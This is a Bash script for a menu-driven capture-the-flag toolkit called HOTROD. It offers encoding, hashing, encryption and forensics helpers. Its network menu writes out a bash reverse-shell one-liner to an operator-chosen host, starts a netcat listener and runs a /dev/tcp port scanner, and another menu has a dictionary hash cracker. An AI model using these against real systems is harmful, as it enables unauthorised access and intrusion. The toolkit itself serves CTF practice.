#!/bin/bash

# ==========================================
# HOTROD TOOLKIT v1.0.4
# Features: Cryptanalysis, Forensics, Network,
#           Smart Input, Auto-Rotating Banners
#           + NETWORK OUTPUT FIX
# ==========================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

VERSION="v1.0.4"
OUTPUT_DIR="ctf_output"
TEMP_FILE=".ctf_temp_buffer"
IS_TEMP=0

mkdir -p "$OUTPUT_DIR"

# ==========================================
# UTILITIES
# ==========================================

pause() {
    echo ""
    read -p "Press [Enter] to continue..."
}

cleanup() {
    if [ "$IS_TEMP" -eq 1 ]; then
        rm -f "$TEMP_FILE" 2>/dev/null
        IS_TEMP=0
    fi
}

get_output_path() {
    local ext="$1"
    local base_name
    if [ "$IS_TEMP" -eq 1 ]; then
        base_name="text_input_$(date +%H%M%S)"
    else
        base_name=$(basename "$TARGET")
    fi
    echo "${OUTPUT_DIR}/${base_name}.${ext}"
}

get_input() {
    echo -e "${CYAN}--- Input Source ---${NC}"
    echo -e "${YELLOW}1.${NC} Select a File"
    echo -e "${YELLOW}2.${NC} Type Text Directly"
    read -p "Choose [1 or 2]: " src_opt

    if [ "$src_opt" == "2" ]; then
        echo -e "${YELLOW}Enter your text below:${NC}"
        read -r user_text
        echo -n "$user_text" > "$TEMP_FILE"
        TARGET="$TEMP_FILE"
        IS_TEMP=1
    else
        read -p "Enter filename: " f
        if [ ! -f "$f" ]; then
            echo -e "${RED}Error: File '$f' not found!${NC}"
            return 1
        fi
        TARGET="$f"
        IS_TEMP=0
    fi
    return 0
}

# ==========================================
# BANNERS & THEMES
# ==========================================
print_banner() {
    clear
    BANNER_STYLE=$((1 + $RANDOM % 30))

    case $BANNER_STYLE in
        1) # Standard
            echo -e "${GREEN}###############################################${NC}"
            echo -e "${GREEN}#               HOTROD $VERSION                #${NC}"
            echo -e "${GREEN}#            CTF SWISS ARMY KNIFE             #${NC}"
            echo -e "${GREEN}#       Outputs saved to: ./ctf_output/       #${NC}"
            echo -e "${GREEN}###############################################${NC}"
            ;;
        2) # Big Block
            echo -e "${RED}"
            echo "  _   _  ____  _______ _____   ____  _____  "
            echo " | | | |/ __ \|__   __|  __ \ / __ \|  __ \ "
            echo " | |_| | |  | |  | |  | |__) | |  | | |  | |"
            echo " |  _  | |  | |  | |  |  _  /| |  | | |  | |"
            echo " | | | | |__| |  | |  | | \ \| |__| | |__| |"
            echo " |_| |_|\____/   |_|  |_|  \_\\____/|_____/ "
            echo -e "${NC}         >> CYBER WARFARE UNIT <<"
            ;;
        3) # Cyberpunk
            echo -e "${CYAN}"
            echo " ///////////////////////////////////////////"
            echo " ///  H  O  T  R  O  D   P R O T O C O L ///"
            echo " ///////////////////////////////////////////"
            echo -e "${PURPLE}"
            echo " [SYSTEM]: ONLINE"
            echo " [VERSION]: $VERSION"
            echo " [STATUS]: WAITING FOR INPUT..."
            echo -e "${NC}"
            ;;
        4) # Biohazard
            echo -e "${YELLOW}"
            echo "       .       "
            echo "     .' '.      WARNING: LETHAL TOOLS DETECTED"
            echo "   .'     '.    "
            echo "  /-.  H  .-\   HOTROD $VERSION"
            echo "  |  \ O /  |   Handle with care"
            echo "   \  |T|  /    "
            echo "    \ |R| /     "
            echo "     '.|.'      "
            echo -e "${NC}"
            ;;
        5) # Matrix
            echo -e "${GREEN}"
            echo " 10010101010101010101010100101010101"
            echo " 0  H O T R O D   T O O L K I T    1"
            echo " 1    Wake up, Neo...              0"
            echo " 0    The shell has you.           1"
            echo " 10010101010101010101010100101010101"
            echo -e "${NC}"
            ;;
        6) # Graffiti
            echo -e "${PURPLE}"
            echo "   (    (        )   (      (     "
            echo "   )\ ) )\ )  ( /(   )\ )   )\ )  "
            echo "  (()/((()/(  )\()) (()/(  (()/(  "
            echo "   /(_))/(_))((_)\   /(_))  /(_)) "
            echo "  (_)) (_))   _((_) (_))   (_))   "
            echo "  | _ \|_ _| | || | | _ \  | _ \  "
            echo "  |   / | |  | __ | |   /  |  _/  "
            echo "  |_|_\.___| |_||_| |_|_\  |_|    "
            echo -e "${NC}"
            ;;
        7) # Skull
            echo -e "${RED}"
            echo "      _______      "
            echo "    .'_/_|_\_'.    HOTROD EXPLOIT SUITE"
            echo "    \(  o o  )/    --------------------"
            echo "    //   w   \\    No System Is Safe"
            echo "   (|    _    |)   "
            echo "     '._/ \_.'     "
            echo -e "${NC}"
            ;;
        8) # Circuit
            echo -e "${BLUE}"
            echo " o--[ H O T R O D ]--o"
            echo " |                   |"
            echo " +--[ $VERSION ]-------+ "
            echo " |                   |"
            echo " o--[ C  T  F ]------o"
            echo -e "${NC}"
            ;;
        9) # Slant
            echo -e "${CYAN}"
            echo "    __  __      __                 __"
            echo "   / / / /___  / /__________  ____/ /"
            echo "  / /_/ / __ \/ __/ ___/ __ \/ __  / "
            echo " / __  / /_/ / /_/ /  / /_/ / /_/ /  "
            echo "/_/ /_/\____/\__/_/   \____/\__,_/   "
            echo -e "${NC}"
            ;;
        10) # Minimalist
            echo -e "${YELLOW}"
            echo "+-------------------------------------+"
            echo "| H O T R O D || C Y B E R || K I T   |"
            echo "+-------------------------------------+"
            echo "| Version: $VERSION                  |"
            echo "+-------------------------------------+"
            echo -e "${NC}"
            ;;
        11) # The Eye
            echo -e "${RED}"
            echo "         .---.         "
            echo "       /  _  \\       OBSERVING..."
            echo "      |  (0)  |       HOTROD $VERSION"
            echo "       \  -  /        "
            echo "        '---'         "
            echo -e "${NC}"
            ;;
        12) # Ghost
            echo -e "${CYAN}"
            echo "     .-."
            echo "   (o o) boo!"
            echo "   | O \\"
            echo "    \\   \\     HOTROD $VERSION"
            echo "     \`~~~'    "
            echo -e "${NC}"
            ;;
        13) # Radio
            echo -e "${GREEN}"
            echo "   [|] "
            echo "    |   __"
            echo "    |  |..|  < Incoming Transmission >"
            echo "   /|\ |__|  < Hotrod Loaded >"
            echo "  / | \\"
            echo -e "${NC}"
            ;;
        14) # Shield
            echo -e "${BLUE}"
            echo "   / \\"
            echo "  | H |  SECURE"
            echo "  | R |  SHELL"
            echo "   \\_/"
            echo -e "${NC}"
            ;;
        15) # Code Rain
            echo -e "${PURPLE}"
            echo "  0 1 0 1"
            echo "  1 0 1 0   HOTROD"
            echo "  0 1 0 1   $VERSION"
            echo "  1 0 1 0"
            echo -e "${NC}"
            ;;
        16) # The Wall
            echo -e "${RED}"
            echo "  [H][O][T][R][O][D] "
            echo "  |__|__|__|__|__|__|"
            echo "  |__|__|__|__|__|__|"
            echo "  |__|__|__|__|__|__| v$VERSION"
            echo -e "${NC}"
            ;;
        17) # Spider
            echo -e "${CYAN}"
            echo "      / _ \ "
            echo "    \_\(_)/_/"
            echo "     _//o\\\\_    WEB"
            echo "      /   \     CRAWLER"
            echo -e "${NC}"
            ;;
        18) # Radiation
            echo -e "${YELLOW}"
            echo "     _.-._"
            echo "    /  |  \\"
            echo "   | - O - |   TOXIC"
            echo "    \  |  /    DATA"
            echo "     '-'-'"
            echo -e "${NC}"
            ;;
        19) # DNA
            echo -e "${PURPLE}"
            echo "    {_} "
            echo "    |(|"
            echo "    |X|  GENETIC"
            echo "    |)|  ALGORITHM"
            echo "    {_}"
            echo -e "${NC}"
            ;;
        20) # Invader
            echo -e "${GREEN}"
            echo "     _   _"
            echo "    ( \ / )"
            echo "   ( \ v / )   GAME"
            echo "    \ ... /    OVER"
            echo "     '...'   "
            echo -e "${NC}"
            ;;
        21) # The Gem
            echo -e "${BLUE}"
            echo "      /\\"
            echo "     /  \\"
            echo "    |HOT |"
            echo "    |ROD |"
            echo "     \  /"
            echo "      \/"
            echo -e "${NC}"
            ;;
        22) # Brackets
            echo -e "${YELLOW}"
            echo "   public class HOTROD {"
            echo "       void pwn() {"
            echo "           system.root = true;"
            echo "       }"
            echo "   }"
            echo -e "${NC}"
            ;;
        23) # Bat
            echo -e "${RED}"
            echo "   /\"\       /\"\\"
            echo "  (   \     /   )"
            echo "   \   \   /   /"
            echo "    \   \_/   /"
            echo "     \       /"
            echo "      '-----' "
            echo -e "${NC}"
            ;;
        24) # Lightning
            echo -e "${CYAN}"
            echo "      /"
            echo "     /    POWER"
            echo "    /     OVERWHELMING"
            echo "   / \ "
            echo "   \ /"
            echo "    /"
            echo -e "${NC}"
            ;;
        25) # Key
            echo -e "${YELLOW}"
            echo "    .---."
            echo "    | H |________________"
            echo "    |___|________________)"
            echo "            ^   ^   ^"
            echo -e "${NC}"
            ;;
        26) # Server Rack
            echo -e "${GREEN}"
            echo "   __________"
            echo "  | [....] | |"
            echo "  | [....] | |"
            echo "  | [....] | |  DATACENTER"
            echo "  |________|_|  ACCESS"
            echo -e "${NC}"
            ;;
        27) # Alien
            echo -e "${GREEN}"
            echo "      o   o"
            echo "       \_/"
            echo "      (o o)"
            echo "     (  v  )  TAKE ME"
            echo "      \___/   TO YOUR LEADER"
            echo -e "${NC}"
            ;;
        28) # Sword
            echo -e "${PURPLE}"
            echo "        |"
            echo "      __|__"
            echo "      \   /"
            echo "       | |"
            echo "       | |"
            echo "       | |    PENETRATION"
            echo "       \_/    TESTING"
            echo -e "${NC}"
            ;;
        29) # Floppy
            echo -e "${BLUE}"
            echo "   __________"
            echo "  | |__| H | |"
            echo "  |        | |"
            echo "  |  SAVE  | |"
            echo "  |________|_|"
            echo -e "${NC}"
            ;;
        30) # Crossbones
            echo -e "${RED}"
            echo "    .x."
            echo "   x | x"
            echo "    \|/"
            echo "    /|\\"
            echo "   x | x"
            echo "    'x'   PIRATE RADIO"
            echo -e "${NC}"
            ;;
    esac

    echo -e "${GREEN}MORE TOOLS : https://github.com/PS-003R32${NC}"
    echo -e "${GREEN}---------------------------------------------${NC}"
}

# ==========================================
# 1. ENCODING
# ==========================================
menu_encoding() {
    while true; do
        cleanup
        print_banner
        echo -e "${CYAN}=== ENCODING & CIPHERS ===${NC}"
        echo -e "${CYAN}1.${NC} Base64 Encode/Decode"
        echo -e "${CYAN}2.${NC} Base32 Encode/Decode"
        echo -e "${CYAN}3.${NC} Hex Encode/Decode"
        echo -e "${CYAN}4.${NC} Binary Encode/Decode (010101) [NEW]"
        echo -e "${CYAN}5.${NC} URL Decode"
        echo -e "${CYAN}6.${NC} Back"
        echo -e "${CYAN}==================================${NC}"
        read -p "Select: " opt
        [ "$opt" == "6" ] && return
        
        get_input || { pause; continue; }
        echo -e "\n${GREEN}>>> Output:${NC}"

        case $opt in
            1) 
               read -p "Mode (e/d): " m
               if [ "$m" == "d" ]; then
                   OUT=$(get_output_path "decoded_b64")
                   base64 -d "$TARGET" | tee "$OUT"
               else
                   OUT=$(get_output_path "b64")
                   base64 "$TARGET" | tee "$OUT"
               fi ;;
            2) 
               read -p "Mode (e/d): " m
               if [ "$m" == "d" ]; then
                   OUT=$(get_output_path "decoded_b32")
                   base32 -d "$TARGET" | tee "$OUT"
               else
                   OUT=$(get_output_path "b32")
                   base32 "$TARGET" | tee "$OUT"
               fi ;;
            3) 
               read -p "Mode (e/d): " m
               if [ "$m" == "d" ]; then
                   OUT=$(get_output_path "bin")
                   xxd -r -p "$TARGET" | tee "$OUT"
               else
                   OUT=$(get_output_path "hex")
                   xxd -p "$TARGET" | tee "$OUT"
               fi ;;
            4)
               read -p "Mode (e/d): " m
               if [ "$m" == "d" ]; then
                   OUT=$(get_output_path "decoded_bin")
                   python3 -c "import sys; b=sys.stdin.read().strip().replace(' ',''); print(''.join([chr(int(b[i:i+8], 2)) for i in range(0, len(b), 8)]))" < "$TARGET" | tee "$OUT"
               else
                   OUT=$(get_output_path "binary")
                   # xxd binary dump
                   xxd -b "$TARGET" | awk '{ $1=""; $(NF)=""; print }' | tr -d '\n' | tee "$OUT"
               fi ;;
            5) 
               OUT=$(get_output_path "urldecoded")
               cat "$TARGET" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))" | tee "$OUT" ;;
        esac
        echo -e "\n\n${YELLOW}[Saved to: $OUT]${NC}"
        pause
    done
}

# ==========================================
# 2. HASHING
# ==========================================
menu_hashing() {
    while true; do
        cleanup
        print_banner
        echo -e "${YELLOW}=== HASHING ===${NC}"
        echo -e "${YELLOW}1.${NC} Calculate MD5 / SHA1 / SHA256"
        echo -e "${YELLOW}2.${NC} Verify Hash (Integrity Check) [NEW]"
        echo -e "${YELLOW}3.${NC} Back"
        echo -e "${YELLOW}===============${NC}"
        read -p "Select: " opt
        [ "$opt" == "3" ] && return
        
        get_input || { pause; continue; }
        
        case $opt in
            1)
                OUT=$(get_output_path "hashes")
                {
                    echo "--- MD5 ---"; md5sum "$TARGET"
                    echo "--- SHA1 ---"; sha1sum "$TARGET"
                    echo "--- SHA256 ---"; sha256sum "$TARGET"
                } | tee "$OUT"
                echo -e "\n${YELLOW}[Saved to: $OUT]${NC}"
                ;;
            2)
                read -p "Enter Expected Hash string: " expected_hash
                expected_hash=$(echo "$expected_hash" | xargs)
                echo -e "${CYAN}Checking...${NC}"
                
                md5=$(md5sum "$TARGET" | awk '{print $1}')
                sha1=$(sha1sum "$TARGET" | awk '{print $1}')
                sha256=$(sha256sum "$TARGET" | awk '{print $1}')

                if [[ "$md5" == "$expected_hash" ]] || [[ "$sha1" == "$expected_hash" ]] || [[ "$sha256" == "$expected_hash" ]]; then
                    echo -e "${GREEN}[SUCCESS] Hash MATCHES! The file is authentic.${NC}"
                else
                    echo -e "${RED}[WARNING] Hash MISMATCH!${NC}"
                    echo "File MD5:    $md5"
                    echo "File SHA1:   $sha1"
                    echo "File SHA256: $sha256"
                    echo "Expected:    $expected_hash"
                fi
                ;;
        esac
        pause
    done
}

# ==========================================
# 3. ENCRYPTION
# ==========================================
menu_encryption() {
    while true; do
        cleanup
        print_banner
        echo -e "${BLUE}=== ENCRYPTION (AES/GPG) ===${NC}"
        echo -e "${BLUE}1.${NC} AES-256 Encrypt"
        echo -e "${BLUE}2.${NC} AES-256 Decrypt"
        echo -e "${BLUE}3.${NC} GPG Encrypt"
        echo -e "${BLUE}4.${NC} GPG Decrypt"
        echo -e "${BLUE}5.${NC} Back"
        echo -e "${BLUE}============================${NC}"
        read -p "Select: " opt
        [ "$opt" == "5" ] && return
        get_input || { pause; continue; }

        case $opt in
            1) 
                OUT=$(get_output_path "enc")
                openssl enc -aes-256-cbc -salt -pbkdf2 -in "$TARGET" -out "$OUT"
                echo -e "${GREEN}Encrypted successfully.${NC}"
                echo -e "${CYAN}Hex Preview:${NC}"
                xxd -l 64 "$OUT"
                echo "..."
                echo -e "${YELLOW}[Saved to: $OUT]${NC}"
                ;;
            2) 
                OUT=$(get_output_path "dec")
                openssl enc -d -aes-256-cbc -pbkdf2 -in "$TARGET" -out "$OUT"
                echo -e "${GREEN}Decrypted successfully. Content:${NC}"
                echo -e "${PURPLE}--------------------------------${NC}"
                cat "$OUT"
                echo -e "${PURPLE}--------------------------------${NC}"
                echo -e "${YELLOW}[Saved to: $OUT]${NC}"
                ;;
            3) 
                read -p "Recipient: " r
                OUT=$(get_output_path "gpg")
                gpg -o "$OUT" -e -r "$r" "$TARGET"
                echo -e "${GREEN}Encrypted successfully.${NC}"
                echo -e "${CYAN}Preview:${NC}"
                head -c 64 "$OUT" | xxd
                echo -e "${YELLOW}[Saved to: $OUT]${NC}"
                ;;
            4) 
                OUT=$(get_output_path "dec_gpg")
                gpg -d "$TARGET" > "$OUT"
                echo -e "${GREEN}Decrypted successfully. Content:${NC}"
                echo -e "${PURPLE}--------------------------------${NC}"
                cat "$OUT"
                echo -e "${PURPLE}--------------------------------${NC}"
                echo -e "${YELLOW}[Saved to: $OUT]${NC}"
                ;;
        esac
        pause
    done
}

# ==========================================
# 4. FORENSICS
# ==========================================
menu_forensics() {
    while true; do
        cleanup
        print_banner
        echo -e "${RED}=== FORENSICS ===${NC}"
        echo -e "${RED}1.${NC} Identify File (Magic Bytes)"
        echo -e "${RED}2.${NC} Strings (Top 20)"
        echo -e "${RED}3.${NC} Extract Metadata (ExifTool) [NEW]"
        echo -e "${RED}4.${NC} Binwalk (Extract Files)"
        echo -e "${RED}5.${NC} Back"
        echo -e "${RED}=================${NC}"
        read -p "Select: " opt
        [ "$opt" == "5" ] && return
        get_input || { pause; continue; }

        case $opt in
            1) file "$TARGET" ;;
            2) strings -n 6 "$TARGET" | head -n 20 ;;
            3) 
               if command -v exiftool &> /dev/null; then
                   exiftool "$TARGET"
               else
                   echo -e "${RED}Error: 'exiftool' not installed.${NC}"
                   echo "Attempting basic extraction with strings/grep..."
                   strings "$TARGET" | grep -iE "date|user|software|camera" | head -n 10
               fi ;;
            4) binwalk "$TARGET" ;;
        esac
        pause
    done
}

# ==========================================
# 5. CRYPTANALYSIS
# ==========================================
menu_analysis() {
    while true; do
        cleanup
        print_banner
        echo -e "${PURPLE}=== CRYPTANALYSIS (ID & BRUTE-FORCE) ===${NC}"
        echo -e "${PURPLE}1.${NC} Identify Hash/Encoding Type"
        echo -e "${PURPLE}2.${NC} Brute-Force: Caesar/ROT (All 26 shifts)"
        echo -e "${PURPLE}3.${NC} Brute-Force: Dictionary Attack (MD5/SHA1)"
        echo -e "${PURPLE}4.${NC} Back"
        echo -e "${PURPLE}========================================${NC}"
        read -p "Select: " opt
        [ "$opt" == "4" ] && return
        
        get_input || { pause; continue; }
        CONTENT=$(cat "$TARGET")
        LEN=${#CONTENT}

        case $opt in
            1) 
                echo -e "\n${GREEN}--- Analysis Report ---${NC}"
                echo "Length: $LEN chars"
                echo "Sample: ${CONTENT:0:20}..."
                echo -e "${CYAN}Possible Types:${NC}"
                
                # Simple Heuristic Check
                if [[ "$CONTENT" =~ ^[0-9a-fA-F]{32}$ ]]; then echo "[+] MD5 Hash"; fi
                if [[ "$CONTENT" =~ ^[0-9a-fA-F]{40}$ ]]; then echo "[+] SHA1 Hash"; fi
                if [[ "$CONTENT" =~ ^[0-9a-fA-F]{64}$ ]]; then echo "[+] SHA256 Hash"; fi
                if [[ "$CONTENT" =~ ^[a-zA-Z0-9+/]*={0,2}$ ]] && (( LEN % 4 == 0 )); then echo "[+] Base64 Encoded String"; fi
                if [[ "$CONTENT" =~ ^[01]+$ ]] && (( LEN % 8 == 0 )); then echo "[+] Binary String"; fi
                if [[ "$CONTENT" =~ ^[a-zA-Z0-9]*$ ]] && [[ "$LEN" -eq 32 ]]; then echo "[+] Possible Base32"; fi
                
                echo -e "\n(Tip: If installed, use 'hashid' for detailed analysis)"
                ;;
            
            2)
                OUT=$(get_output_path "rot_bruteforce.txt")
                echo -e "${GREEN}Attempting all 26 rotations...${NC}"
                python3 -c "
import sys
s = sys.stdin.read().strip()
for i in range(1, 27):
    result = ''
    for c in s:
        if c.isalpha():
            base = 65 if c.isupper() else 97
            result += chr((ord(c) - base + i) % 26 + base)
        else:
            result += c
    print(f'ROT{i:02d}: {result}')
" < "$TARGET" | tee "$OUT"
                echo -e "\n${YELLOW}[Results saved to $OUT]${NC}"
                ;;
                
            3)
                echo -e "${RED}--- Dictionary Attack (Wordlist) ---${NC}"
                read -p "Enter path to wordlist (e.g. rockyou.txt): " wordlist
                if [ ! -f "$wordlist" ]; then echo "Wordlist not found."; pause; continue; fi
                
                read -p "Select Type [1] MD5  [2] SHA1: " htype
                echo -e "${GREEN}Cracking... (Ctrl+C to abort)${NC}"
                
                found=0
                while read -r word; do
                    if [ "$htype" == "1" ]; then
                        h=$(echo -n "$word" | md5sum | awk '{print $1}')
                    else
                        h=$(echo -n "$word" | sha1sum | awk '{print $1}')
                    fi
                    
                    if [ "$h" == "$CONTENT" ]; then
                        echo -e "\n${GREEN}!!! PASSWORD FOUND !!!${NC}"
                        echo -e "Hash: $CONTENT"
                        echo -e "Plaintext: $word"
                        found=1
                        break
                    fi
                done < "$wordlist"
                
                if [ $found -eq 0 ]; then echo -e "\n${RED}Password not found in wordlist.${NC}"; fi
                ;;
        esac
        pause
    done
}

# ==========================================
# 6. NETWORK & SHELLS (FIXED)
# ==========================================
menu_network() {
    while true; do
        clear
        print_banner
        echo -e "${PURPLE}=== NETWORK & SHELLS ===${NC}"
        echo -e "${PURPLE}1.${NC} Start Netcat Listener"
        echo -e "${PURPLE}2.${NC} Generate Reverse Shells"
        echo -e "${PURPLE}3.${NC} Local Interfaces (IP)"
        echo -e "${PURPLE}4.${NC} Get Public IP [NEW]"
        echo -e "${PURPLE}5.${NC} Simple Port Scanner (Bash) [NEW]"
        echo -e "${PURPLE}6.${NC} Back"
        echo -e "${PURPLE}========================${NC}"
        read -p "Select: " opt
        case $opt in
            1) 
               read -p "Port: " p
               echo -e "${GREEN}Starting listener on port $p... (Ctrl+C to stop)${NC}"
               nc -lvnp "$p"
               pause ;;
            2) 
               read -p "LHOST: " lh
               read -p "LPORT: " lp
               OUT=$(get_output_path "rev_shell.txt")
               {
                 echo "Bash TCP Reverse Shell:"
                 echo "bash -i >& /dev/tcp/$lh/$lp 0>&1"
               } | tee "$OUT"
               echo -e "${YELLOW}[Saved to: $OUT]${NC}"
               pause ;;
            3) 
               OUT=$(get_output_path "local_ip.txt")
               ip -c addr | tee "$OUT"
               echo -e "${YELLOW}[Saved to: $OUT]${NC}"
               pause ;;
            4) 
               echo -e "${YELLOW}Fetching Public IP...${NC}"
               OUT=$(get_output_path "public_ip.txt")
               curl -s ifconfig.me | tee "$OUT"
               echo ""
               echo -e "${YELLOW}[Saved to: $OUT]${NC}"
               pause ;;
            5) 
               read -p "Target IP: " host
               read -p "Start Port: " start_port
               read -p "End Port: " end_port
               OUT=$(get_output_path "scan_${host}.txt")
               
               echo -e "${GREEN}Scanning $host ($start_port - $end_port)...${NC}"
               (
                 for ((port=$start_port; port<=$end_port; port++)); do
                   timeout 0.1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null && echo -e "Port $port: [OPEN]"
                 done
               ) | tee "$OUT"
               
               echo -e "${YELLOW}[Scan results saved to: $OUT]${NC}"
               pause ;;
            6) return ;;
        esac
    done
}

# ==========================================
# MAIN LOOP
# ==========================================
trap cleanup EXIT
while true; do
    print_banner
    echo -e "${CYAN}1.${NC} Encoding & Ciphers"
    echo -e "${CYAN}2.${NC} Hashing Utilities"
    echo -e "${CYAN}3.${NC} Encryption (AES/GPG)"
    echo -e "${CYAN}4.${NC} File Forensics"
    echo -e "${CYAN}5.${NC} Cryptanalysis (ID & Brute-force)"
    echo -e "${CYAN}6.${NC} Network & Shells"
    echo -e "${RED}7.${NC} Exit"
    echo -e "${GREEN}---------------------------------------------${NC}"
    read -p "Select Module [1-7]: " choice

    case $choice in
        1) menu_encoding ;;
        2) menu_hashing ;;
        3) menu_encryption ;;
        4) menu_forensics ;;
        5) menu_analysis ;;
        6) menu_network ;;
        7) cleanup; exit 0 ;;
        *) echo "Invalid option." ;;
    esac
done
